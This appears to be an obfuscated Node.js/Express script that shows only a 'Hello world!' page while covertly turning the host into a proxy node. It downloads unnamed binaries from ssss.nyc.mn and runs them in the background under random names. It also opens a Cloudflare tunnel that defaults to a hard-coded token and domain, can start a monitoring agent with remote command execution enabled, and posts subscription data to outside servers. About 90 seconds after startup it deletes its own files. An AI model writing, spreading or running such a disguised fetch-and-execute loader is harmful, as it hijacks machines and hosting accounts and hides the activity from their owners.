const _0x6da801=_0x9f70;function _0x4644(){const _0x47ac8c=['list.txt','/api/add-subscriptions','env','set','error','Empowerment\x20success\x20for\x20','message','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','TunnelSecret','https://oooo.serv00.net/add-url','\x20already\x20exists','UPLOAD_URL','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','1461764VfXUpN','eyJhIjoiNWZkMTM3ZWQ0NzliNGY5MDkwZDhhNzYxZjgwNjZkYjciLCJ0IjoiNDdiODJiMDYtYzQwYS00OGIxLWIzYzktNDQ4YWZiNGQ4OWNlIiwicyI6Ik1HRmpaR1EzWXpNdE5ESXlPUzAwWm1KaExUbGtNak10T1Rnd04yVmhNV1ZrTW1VMCJ9','floor','includes','\x20failed:\x20','Unhandled\x20error\x20in\x20startserver:','join','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','blackhole','App\x20is\x20running','forEach','\x20-s\x20','firefox','match','catch','2096','NEZHA\x20variable\x20is\x20empty,skip\x20running','utf-8','base64','tunnel.json','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','tls','/sub.txt\x20saved\x20successfully','nohup\x20','ARGO_AUTH','https://amd64.ssss.nyc.mn/v1','Download\x20','/dev/null','close','arm','existsSync','config.yaml','data','direct','\x0a\x0atrojan://','http://ip-api.com/json/','get','countryCode','\x0a\x0avmess://','writeFileSync','Error\x20reading\x20boot.log:','web\x20running\x20error:\x20','14429950EHgDLj','\x0a\x20\x20\x20\x20','config.json','charAt','jiakuan','https+local://8.8.8.8/dns-query','Skipping\x20adding\x20automatic\x20access\x20task','path','\x20is\x20created','test','1431WVkrhp','1120','NAME','npm\x20running\x20error:\x20','send','toString','CFPORT','none','fileUrl','http\x20server\x20is\x20running\x20on\x20port:','sub.txt','Error\x20in\x20startserver:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','application/json','taskkill\x20/f\x20/im\x20','country_code','8443','ARGO_DOMAIN:','4185234dFyAIS','&path=%2Fvless-argo%3Fed%3D2560#','org','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','text/plain;\x20charset=utf-8','\x0avless://','status','stringify','./tmp','ARGO_PORT','238186KOodJV','/api/add-nodes','127.0.0.1','from','1462812OsbCeK','Error\x20downloading\x20files:','Nodes\x20uploaded\x20successfully','clear','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Content-Type','\x20>/dev/null\x202>&1\x20&','Add\x20automatic\x20access\x20task\x20faild:\x20','child_process','28841670AjUfgF','xtls-rprx-vision','automatic\x20access\x20task\x20added\x20successfully','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','log','https://arm64.ssss.nyc.mn/web','/vmess-argo?ed=2560','arm64','unlink','pkill\x20-f\x20\x22[','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','exec','quic','has','random','post','/tunnel.yml\x20run','amd','PORT','basename','tcp','\x20is\x20running','4mMXAJb','7wFuyWS','pop','ccfef613-918b-4a3d-a0e9-e36016f1d70f','Hello\x20world!','Subscription\x20uploaded\x20successfully','substring','UUID','pipe','arch','response','platform','&path=%2Ftrojan-argo%3Fed%3D2560#','rm\x20-rf\x20','ArgoDomain:','util','https://amd64.ssss.nyc.mn/agent','mkdirSync','filter','push','tunnel.yml','97104OhgvDC','map','http','https://arm64.ssss.nyc.mn/agent','/vmess-argo','axios','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','2083','listen','/vless-argo','?encryption=none&security=tls&sni=','\x20jiakuan.230408.xyz','vless','trojan','https://arm64.ssss.nyc.mn/v1','NEZHA_SERVER','\x20-c\x20','\x20>\x20nul\x202>&1','PROJECT_URL','vmess','chmod','https://amd64.ssss.nyc.mn/web','all','&fp=firefox&type=ws&host=','20noZnCv','2053','split','unlinkSync','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','boot.log','\x0aclient_secret:\x20','cdns.doon.eu.org','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','false','/api/delete-nodes','2087','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','isFile','length','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','express'];_0x4644=function(){return _0x47ac8c;};return _0x4644();}(function(_0x2ad650,_0x24e695){const _0x2e20a4=_0x9f70,_0x310ebb=_0x2ad650();while(!![]){try{const _0x272637=parseInt(_0x2e20a4(0x12d))/0x1*(parseInt(_0x2e20a4(0x10a))/0x2)+parseInt(_0x2e20a4(0x10e))/0x3+parseInt(_0x2e20a4(0xba))/0x4*(parseInt(_0x2e20a4(0x9c))/0x5)+parseInt(_0x2e20a4(0x100))/0x6*(parseInt(_0x2e20a4(0x70))/0x7)+-parseInt(_0x2e20a4(0x84))/0x8*(-parseInt(_0x2e20a4(0xee))/0x9)+-parseInt(_0x2e20a4(0xe4))/0xa+-parseInt(_0x2e20a4(0x117))/0xb;if(_0x272637===_0x24e695)break;else _0x310ebb['push'](_0x310ebb['shift']());}catch(_0x20b304){_0x310ebb['push'](_0x310ebb['shift']());}}}(_0x4644,0xf1460));const express=require(_0x6da801(0xac)),app=express(),axios=require(_0x6da801(0x89)),os=require('os'),fs=require('fs'),path=require(_0x6da801(0xeb)),{promisify}=require(_0x6da801(0x7e)),exec=promisify(require(_0x6da801(0x116))[_0x6da801(0x122)]),{execSync}=require(_0x6da801(0x116)),UPLOAD_URL=process[_0x6da801(0xaf)][_0x6da801(0xb8)]||'',PROJECT_URL=process[_0x6da801(0xaf)][_0x6da801(0x96)]||'',AUTO_ACCESS=process[_0x6da801(0xaf)]['AUTO_ACCESS']||![],FILE_PATH=process['env']['FILE_PATH']||_0x6da801(0x108),SUB_PATH=process['env']['SUB_PATH']||_0x6da801(0xef),PORT=process[_0x6da801(0xaf)]['SERVER_PORT']||process['env'][_0x6da801(0x129)]||0xbb8,UUID=process['env'][_0x6da801(0x76)]||_0x6da801(0x72),NEZHA_SERVER=process[_0x6da801(0xaf)][_0x6da801(0x93)]||'',NEZHA_PORT=process[_0x6da801(0xaf)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x6da801(0xaf)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x6da801(0xaf)]['ARGO_DOMAIN']||_0x6da801(0x8f),ARGO_AUTH=process[_0x6da801(0xaf)][_0x6da801(0xd2)]||_0x6da801(0xbb),ARGO_PORT=process['env'][_0x6da801(0x109)]||0x1f41,CFIP=process[_0x6da801(0xaf)]['CFIP']||_0x6da801(0xa3),CFPORT=process[_0x6da801(0xaf)][_0x6da801(0xf4)]||0x1bb,NAME=process[_0x6da801(0xaf)][_0x6da801(0xf0)]||_0x6da801(0xe8);!fs[_0x6da801(0xd8)](FILE_PATH)?(fs[_0x6da801(0x80)](FILE_PATH),console[_0x6da801(0x11b)](FILE_PATH+_0x6da801(0xec))):console['log'](FILE_PATH+_0x6da801(0xb7));function generateRandomName(){const _0x43561b=_0x6da801,_0x95257e='abcdefghijklmnopqrstuvwxyz';let _0x2c41ad='';for(let _0x2b93b4=0x0;_0x2b93b4<0x6;_0x2b93b4++){_0x2c41ad+=_0x95257e[_0x43561b(0xe7)](Math[_0x43561b(0xbc)](Math[_0x43561b(0x125)]()*_0x95257e['length']));}return _0x2c41ad;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x6da801(0xc0)](FILE_PATH,phpName),webPath=path[_0x6da801(0xc0)](FILE_PATH,webName),botPath=path[_0x6da801(0xc0)](FILE_PATH,botName),subPath=path[_0x6da801(0xc0)](FILE_PATH,_0x6da801(0xf8)),listPath=path['join'](FILE_PATH,_0x6da801(0xad)),bootLogPath=path[_0x6da801(0xc0)](FILE_PATH,_0x6da801(0xa1)),configPath=path[_0x6da801(0xc0)](FILE_PATH,_0x6da801(0xe6));function deleteNodes(){const _0xa9a6eb=_0x6da801;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2d6bdc;try{_0x2d6bdc=fs['readFileSync'](subPath,_0xa9a6eb(0xcb));}catch{return null;}const _0x1dd6ea=Buffer['from'](_0x2d6bdc,_0xa9a6eb(0xcc))[_0xa9a6eb(0xf3)](_0xa9a6eb(0xcb)),_0x456aaa=_0x1dd6ea[_0xa9a6eb(0x9e)]('\x0a')[_0xa9a6eb(0x81)](_0x1f2a6e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xa9a6eb(0xed)](_0x1f2a6e));if(_0x456aaa[_0xa9a6eb(0xaa)]===0x0)return;return axios[_0xa9a6eb(0x126)](UPLOAD_URL+_0xa9a6eb(0xa6),JSON['stringify']({'nodes':_0x456aaa}),{'headers':{'Content-Type':_0xa9a6eb(0xfb)}})[_0xa9a6eb(0xc8)](_0x1e366c=>{return null;}),null;}catch(_0x213367){return null;}}function cleanupOldFiles(){const _0x3b457d=_0x6da801;try{const _0x2f544a=fs['readdirSync'](FILE_PATH);_0x2f544a[_0x3b457d(0xc4)](_0x13595e=>{const _0x2e694b=_0x3b457d,_0x170cf9=path[_0x2e694b(0xc0)](FILE_PATH,_0x13595e);try{const _0x1051a8=fs['statSync'](_0x170cf9);_0x1051a8[_0x2e694b(0xa9)]()&&fs[_0x2e694b(0x9f)](_0x170cf9);}catch(_0xe86499){}});}catch(_0x2c8930){}}app[_0x6da801(0xde)]('/',function(_0x235016,_0x45f4c4){const _0x289623=_0x6da801;_0x45f4c4[_0x289623(0xf2)](_0x289623(0x73));});function _0x9f70(_0xe71287,_0x178528){_0xe71287=_0xe71287-0x70;const _0x464484=_0x4644();let _0x9f7082=_0x464484[_0xe71287];return _0x9f7082;}async function generateConfig(){const _0xdc56a6=_0x6da801,_0x296cb0={'log':{'access':_0xdc56a6(0xd5),'error':_0xdc56a6(0xd5),'loglevel':_0xdc56a6(0xf5)},'inbounds':[{'port':ARGO_PORT,'protocol':_0xdc56a6(0x90),'settings':{'clients':[{'id':UUID,'flow':_0xdc56a6(0x118)}],'decryption':_0xdc56a6(0xf5),'fallbacks':[{'dest':0xbb9},{'path':_0xdc56a6(0x8d),'dest':0xbba},{'path':_0xdc56a6(0x88),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0xdc56a6(0x10c),'protocol':_0xdc56a6(0x90),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0xdc56a6(0x12b),'security':'none'}},{'port':0xbba,'listen':_0xdc56a6(0x10c),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0xdc56a6(0xf5),'wsSettings':{'path':_0xdc56a6(0x8d)}},'sniffing':{'enabled':!![],'destOverride':[_0xdc56a6(0x86),_0xdc56a6(0xcf),_0xdc56a6(0x123)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0xdc56a6(0x97),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0xdc56a6(0x88)}},'sniffing':{'enabled':!![],'destOverride':[_0xdc56a6(0x86),_0xdc56a6(0xcf),_0xdc56a6(0x123)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0xdc56a6(0x10c),'protocol':_0xdc56a6(0x91),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0xdc56a6(0x86),_0xdc56a6(0xcf),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0xdc56a6(0xe9)]},'outbounds':[{'protocol':'freedom','tag':_0xdc56a6(0xdb)},{'protocol':_0xdc56a6(0xc2),'tag':'block'}]};fs[_0xdc56a6(0xe1)](path[_0xdc56a6(0xc0)](FILE_PATH,_0xdc56a6(0xe6)),JSON[_0xdc56a6(0x107)](_0x296cb0,null,0x2));}function getSystemArchitecture(){const _0x4f7097=_0x6da801,_0x3a0aa5=os[_0x4f7097(0x78)]();return _0x3a0aa5===_0x4f7097(0xd7)||_0x3a0aa5===_0x4f7097(0x11e)||_0x3a0aa5==='aarch64'?_0x4f7097(0xd7):_0x4f7097(0x128);}function downloadFile(_0x3e4a43,_0x3c3f05,_0x1e497f){const _0xa4e98a=_0x6da801,_0x3261b1=_0x3e4a43;!fs[_0xa4e98a(0xd8)](FILE_PATH)&&fs[_0xa4e98a(0x80)](FILE_PATH,{'recursive':!![]});const _0xd34702=fs['createWriteStream'](_0x3261b1);axios({'method':_0xa4e98a(0xde),'url':_0x3c3f05,'responseType':'stream'})['then'](_0x53d6ac=>{const _0x335921=_0xa4e98a;_0x53d6ac[_0x335921(0xda)][_0x335921(0x77)](_0xd34702),_0xd34702['on']('finish',()=>{const _0x5daac4=_0x335921;_0xd34702[_0x5daac4(0xd6)](),console['log'](_0x5daac4(0xd4)+path[_0x5daac4(0x12a)](_0x3261b1)+'\x20successfully'),_0x1e497f(null,_0x3261b1);}),_0xd34702['on'](_0x335921(0xb1),_0x338314=>{const _0x1b5934=_0x335921;fs[_0x1b5934(0x11f)](_0x3261b1,()=>{});const _0x4138db=_0x1b5934(0xd4)+path[_0x1b5934(0x12a)](_0x3261b1)+_0x1b5934(0xbe)+_0x338314[_0x1b5934(0xb3)];console[_0x1b5934(0xb1)](_0x4138db),_0x1e497f(_0x4138db);});})['catch'](_0x2b6ca9=>{const _0x4a4db1=_0xa4e98a,_0x153015='Download\x20'+path[_0x4a4db1(0x12a)](_0x3261b1)+_0x4a4db1(0xbe)+_0x2b6ca9[_0x4a4db1(0xb3)];console[_0x4a4db1(0xb1)](_0x153015),_0x1e497f(_0x153015);});}async function downloadFilesAndRun(){const _0x1d24b7=_0x6da801,_0x41d22a=getSystemArchitecture(),_0x5eddc8=getFilesForArchitecture(_0x41d22a);if(_0x5eddc8['length']===0x0){console[_0x1d24b7(0x11b)](_0x1d24b7(0x8a));return;}const _0x3abc39=_0x5eddc8[_0x1d24b7(0x85)](_0x597a26=>{return new Promise((_0x594da1,_0x413c06)=>{const _0x556955=_0x9f70;downloadFile(_0x597a26['fileName'],_0x597a26[_0x556955(0xf6)],(_0x9b1a73,_0xcee65c)=>{_0x9b1a73?_0x413c06(_0x9b1a73):_0x594da1(_0xcee65c);});});});try{await Promise[_0x1d24b7(0x9a)](_0x3abc39);}catch(_0x1ef973){console[_0x1d24b7(0xb1)](_0x1d24b7(0x10f),_0x1ef973);return;}function _0x273b8d(_0x54fdf5){const _0x5004ec=0x1fd;_0x54fdf5['forEach'](_0x1cf295=>{const _0x187a5d=_0x9f70;fs[_0x187a5d(0xd8)](_0x1cf295)&&fs[_0x187a5d(0x98)](_0x1cf295,_0x5004ec,_0x50fab3=>{const _0x4a21f7=_0x187a5d;_0x50fab3?console['error']('Empowerment\x20failed\x20for\x20'+_0x1cf295+':\x20'+_0x50fab3):console[_0x4a21f7(0x11b)](_0x4a21f7(0xb2)+_0x1cf295+':\x20'+_0x5004ec[_0x4a21f7(0xf3)](0x8));});});}const _0x430d5a=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x273b8d(_0x430d5a);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x34587d=NEZHA_SERVER[_0x1d24b7(0xbd)](':')?NEZHA_SERVER['split'](':')[_0x1d24b7(0x71)]():'',_0x31da79=new Set(['443','8443','2096',_0x1d24b7(0xa7),_0x1d24b7(0x8b),_0x1d24b7(0x9d)]),_0x41fabf=_0x31da79[_0x1d24b7(0x124)](_0x34587d)?'true':_0x1d24b7(0xa5),_0x1c1438=_0x1d24b7(0xa2)+NEZHA_KEY+_0x1d24b7(0xab)+NEZHA_SERVER+_0x1d24b7(0xa0)+_0x41fabf+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1d24b7(0xe1)](path['join'](FILE_PATH,_0x1d24b7(0xd9)),_0x1c1438);const _0x2d5dc5=_0x1d24b7(0xd1)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x1d24b7(0xa4);try{await exec(_0x2d5dc5),console['log'](phpName+_0x1d24b7(0x12c)),await new Promise(_0x49e622=>setTimeout(_0x49e622,0x3e8));}catch(_0x1328b2){console[_0x1d24b7(0xb1)]('php\x20running\x20error:\x20'+_0x1328b2);}}else{let _0xb00c06='';const _0x2f147a=['443',_0x1d24b7(0xfe),_0x1d24b7(0xc9),'2087','2083','2053'];_0x2f147a[_0x1d24b7(0xbd)](NEZHA_PORT)&&(_0xb00c06='--tls');const _0xc47b78=_0x1d24b7(0xd1)+npmPath+_0x1d24b7(0xc5)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xb00c06+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0xc47b78),console['log'](npmName+_0x1d24b7(0x12c)),await new Promise(_0x1b2e62=>setTimeout(_0x1b2e62,0x3e8));}catch(_0x2d0332){console[_0x1d24b7(0xb1)](_0x1d24b7(0xf1)+_0x2d0332);}}}else console[_0x1d24b7(0x11b)](_0x1d24b7(0xca));const _0x43e596='nohup\x20'+webPath+_0x1d24b7(0x94)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x43e596),console[_0x1d24b7(0x11b)](webName+_0x1d24b7(0x12c)),await new Promise(_0x14c314=>setTimeout(_0x14c314,0x3e8));}catch(_0x39c8dd){console[_0x1d24b7(0xb1)](_0x1d24b7(0xe3)+_0x39c8dd);}if(fs['existsSync'](botPath)){let _0x2ee68f;if(ARGO_AUTH[_0x1d24b7(0xc7)](/^[A-Z0-9a-z=]{120,250}$/))_0x2ee68f=_0x1d24b7(0x103)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x2ee68f=_0x1d24b7(0xc1)+FILE_PATH+_0x1d24b7(0x127):_0x2ee68f=_0x1d24b7(0xce)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1d24b7(0xd1)+botPath+'\x20'+_0x2ee68f+_0x1d24b7(0x114)),console[_0x1d24b7(0x11b)](botName+'\x20is\x20running'),await new Promise(_0x46bb3=>setTimeout(_0x46bb3,0x7d0));}catch(_0x38c61e){console[_0x1d24b7(0xb1)]('Error\x20executing\x20command:\x20'+_0x38c61e);}}await new Promise(_0x26716b=>setTimeout(_0x26716b,0x1388));}function getFilesForArchitecture(_0x47d9c7){const _0x231145=_0x6da801;let _0x408080;_0x47d9c7===_0x231145(0xd7)?_0x408080=[{'fileName':webPath,'fileUrl':_0x231145(0x11c)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x408080=[{'fileName':webPath,'fileUrl':_0x231145(0x99)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x189324=_0x47d9c7===_0x231145(0xd7)?_0x231145(0x87):_0x231145(0x7f);_0x408080['unshift']({'fileName':npmPath,'fileUrl':_0x189324});}else{const _0x53e8e0=_0x47d9c7===_0x231145(0xd7)?_0x231145(0x92):_0x231145(0xd3);_0x408080['unshift']({'fileName':phpPath,'fileUrl':_0x53e8e0});}}return _0x408080;}function argoType(){const _0x5a9c9b=_0x6da801;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5a9c9b(0x11b)](_0x5a9c9b(0x121));return;}if(ARGO_AUTH[_0x5a9c9b(0xbd)](_0x5a9c9b(0xb5))){fs[_0x5a9c9b(0xe1)](path[_0x5a9c9b(0xc0)](FILE_PATH,_0x5a9c9b(0xcd)),ARGO_AUTH);const _0x55d3b2='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x5a9c9b(0x9e)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x5a9c9b(0xc0)](FILE_PATH,_0x5a9c9b(0xcd))+_0x5a9c9b(0x11a)+ARGO_DOMAIN+_0x5a9c9b(0xb4)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x5a9c9b(0xc0)](FILE_PATH,_0x5a9c9b(0x83)),_0x55d3b2);}else console[_0x5a9c9b(0x11b)](_0x5a9c9b(0xb9));}async function extractDomains(){const _0x7e0560=_0x6da801;let _0x61dbe4;if(ARGO_AUTH&&ARGO_DOMAIN)_0x61dbe4=ARGO_DOMAIN,console['log'](_0x7e0560(0xff),_0x61dbe4),await _0x224d55(_0x61dbe4);else try{const _0xeb8e25=fs['readFileSync'](path['join'](FILE_PATH,_0x7e0560(0xa1)),_0x7e0560(0xcb)),_0x20ab77=_0xeb8e25[_0x7e0560(0x9e)]('\x0a'),_0x54715a=[];_0x20ab77[_0x7e0560(0xc4)](_0x37d1ae=>{const _0x5b7029=_0x7e0560,_0x33e0c9=_0x37d1ae[_0x5b7029(0xc7)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x33e0c9){const _0x432feb=_0x33e0c9[0x1];_0x54715a['push'](_0x432feb);}});if(_0x54715a[_0x7e0560(0xaa)]>0x0)_0x61dbe4=_0x54715a[0x0],console['log'](_0x7e0560(0x7d),_0x61dbe4),await _0x224d55(_0x61dbe4);else{console[_0x7e0560(0x11b)](_0x7e0560(0xfa)),fs[_0x7e0560(0x9f)](path['join'](FILE_PATH,_0x7e0560(0xa1)));async function _0x5b3cf8(){const _0x3b90bb=_0x7e0560;try{process['platform']==='win32'?await exec(_0x3b90bb(0xfc)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x3b90bb(0x120)+botName[_0x3b90bb(0xe7)](0x0)+']'+botName[_0x3b90bb(0x75)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x2fb878){}}_0x5b3cf8(),await new Promise(_0x37f92d=>setTimeout(_0x37f92d,0xbb8));const _0x1a5c12=_0x7e0560(0xce)+FILE_PATH+_0x7e0560(0x112)+ARGO_PORT;try{await exec(_0x7e0560(0xd1)+botPath+'\x20'+_0x1a5c12+_0x7e0560(0x114)),console['log'](botName+_0x7e0560(0x12c)),await new Promise(_0xbc0e9=>setTimeout(_0xbc0e9,0xbb8)),await extractDomains();}catch(_0x2eecf9){console['error']('Error\x20executing\x20command:\x20'+_0x2eecf9);}}}catch(_0x1d6d83){console[_0x7e0560(0xb1)](_0x7e0560(0xe2),_0x1d6d83);}async function _0x5190d4(){const _0x473a84=_0x7e0560;try{const _0xf58acf=await axios[_0x473a84(0xde)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0xf58acf[_0x473a84(0xda)]&&_0xf58acf[_0x473a84(0xda)][_0x473a84(0xfd)]&&_0xf58acf['data'][_0x473a84(0x102)])return _0xf58acf['data'][_0x473a84(0xfd)]+'_'+_0xf58acf[_0x473a84(0xda)]['org'];}catch(_0x11acc8){try{const _0x2dae2d=await axios[_0x473a84(0xde)](_0x473a84(0xdd),{'timeout':0xbb8});if(_0x2dae2d[_0x473a84(0xda)]&&_0x2dae2d[_0x473a84(0xda)]['status']==='success'&&_0x2dae2d[_0x473a84(0xda)][_0x473a84(0xdf)]&&_0x2dae2d['data'][_0x473a84(0x102)])return _0x2dae2d[_0x473a84(0xda)]['countryCode']+'_'+_0x2dae2d['data'][_0x473a84(0x102)];}catch(_0x4d8302){}}return'Unknown';}async function _0x224d55(_0x20f77f){const _0x47f2ab=await _0x5190d4(),_0xb28bdb=NAME?NAME+'-'+_0x47f2ab:_0x47f2ab;return new Promise(_0x239791=>{setTimeout(()=>{const _0x8496d9=_0x9f70,_0x1a09a2={'v':'2','ps':''+_0xb28bdb,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x8496d9(0xf5),'host':_0x20f77f,'path':_0x8496d9(0x11d),'tls':_0x8496d9(0xcf),'sni':_0x20f77f,'alpn':'','fp':_0x8496d9(0xc6)},_0x29d53a=_0x8496d9(0x105)+UUID+'@'+CFIP+':'+CFPORT+_0x8496d9(0x8e)+_0x20f77f+_0x8496d9(0x9b)+_0x20f77f+_0x8496d9(0x101)+_0xb28bdb+_0x8496d9(0xe0)+Buffer[_0x8496d9(0x10d)](JSON[_0x8496d9(0x107)](_0x1a09a2))[_0x8496d9(0xf3)](_0x8496d9(0xcc))+_0x8496d9(0xdc)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x20f77f+_0x8496d9(0x9b)+_0x20f77f+_0x8496d9(0x7b)+_0xb28bdb+_0x8496d9(0xe5);console[_0x8496d9(0x11b)](Buffer[_0x8496d9(0x10d)](_0x29d53a)[_0x8496d9(0xf3)]('base64')),fs[_0x8496d9(0xe1)](subPath,Buffer[_0x8496d9(0x10d)](_0x29d53a)['toString'](_0x8496d9(0xcc))),console[_0x8496d9(0x11b)](FILE_PATH+_0x8496d9(0xd0)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x382483,_0x271b89)=>{const _0x3510e2=_0x8496d9,_0x18db49=Buffer[_0x3510e2(0x10d)](_0x29d53a)['toString'](_0x3510e2(0xcc));_0x271b89[_0x3510e2(0xb0)](_0x3510e2(0x113),_0x3510e2(0x104)),_0x271b89[_0x3510e2(0xf2)](_0x18db49);}),_0x239791(_0x29d53a);},0x7d0);});}}async function uploadNodes(){const _0x142181=_0x6da801;if(UPLOAD_URL&&PROJECT_URL){const _0x3b4c89=PROJECT_URL+'/'+SUB_PATH,_0x2906ef={'subscription':[_0x3b4c89]};try{const _0x10149d=await axios[_0x142181(0x126)](UPLOAD_URL+_0x142181(0xae),_0x2906ef,{'headers':{'Content-Type':_0x142181(0xfb)}});return _0x10149d&&_0x10149d[_0x142181(0x106)]===0xc8?(console['log'](_0x142181(0x74)),_0x10149d):null;}catch(_0x5d32d8){if(_0x5d32d8[_0x142181(0x79)]){if(_0x5d32d8[_0x142181(0x79)][_0x142181(0x106)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x142181(0xd8)](listPath))return;const _0x4a4911=fs['readFileSync'](listPath,'utf-8'),_0x4275af=_0x4a4911['split']('\x0a')[_0x142181(0x81)](_0x35cf93=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x142181(0xed)](_0x35cf93));if(_0x4275af[_0x142181(0xaa)]===0x0)return;const _0x367c15=JSON[_0x142181(0x107)]({'nodes':_0x4275af});try{const _0x26276c=await axios[_0x142181(0x126)](UPLOAD_URL+_0x142181(0x10b),_0x367c15,{'headers':{'Content-Type':_0x142181(0xfb)}});return _0x26276c&&_0x26276c[_0x142181(0x106)]===0xc8?(console[_0x142181(0x11b)](_0x142181(0x110)),_0x26276c):null;}catch(_0x5ecb1d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x585f5c=_0x9f70,_0x5166ec=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5166ec['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5166ec[_0x585f5c(0x82)](phpPath);process[_0x585f5c(0x7a)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x5166ec[_0x585f5c(0xc0)]('\x20')+_0x585f5c(0x95),_0x215eb8=>{const _0x30fa1f=_0x585f5c;console[_0x30fa1f(0x111)](),console[_0x30fa1f(0x11b)](_0x30fa1f(0xc3)),console[_0x30fa1f(0x11b)](_0x30fa1f(0xa8));}):exec(_0x585f5c(0x7c)+_0x5166ec[_0x585f5c(0xc0)]('\x20')+'\x20>/dev/null\x202>&1',_0x59a54c=>{const _0x1a3dc4=_0x585f5c;console[_0x1a3dc4(0x111)](),console[_0x1a3dc4(0x11b)](_0x1a3dc4(0xc3)),console['log'](_0x1a3dc4(0xa8));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4f55b8=_0x6da801;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4f55b8(0x11b)](_0x4f55b8(0xea));return;}try{const _0x3be043=await axios[_0x4f55b8(0x126)](_0x4f55b8(0xb6),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x4f55b8(0x119)),_0x3be043;}catch(_0x53c68c){return console[_0x4f55b8(0xb1)](_0x4f55b8(0x115)+_0x53c68c[_0x4f55b8(0xb3)]),null;}}async function startserver(){const _0x48646f=_0x6da801;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x56fabf){console['error'](_0x48646f(0xf9),_0x56fabf);}}startserver()[_0x6da801(0xc8)](_0x18d53d=>{const _0x16a969=_0x6da801;console[_0x16a969(0xb1)](_0x16a969(0xbf),_0x18d53d);}),app[_0x6da801(0x8c)](PORT,()=>console['log'](_0x6da801(0xf7)+PORT+'!'));
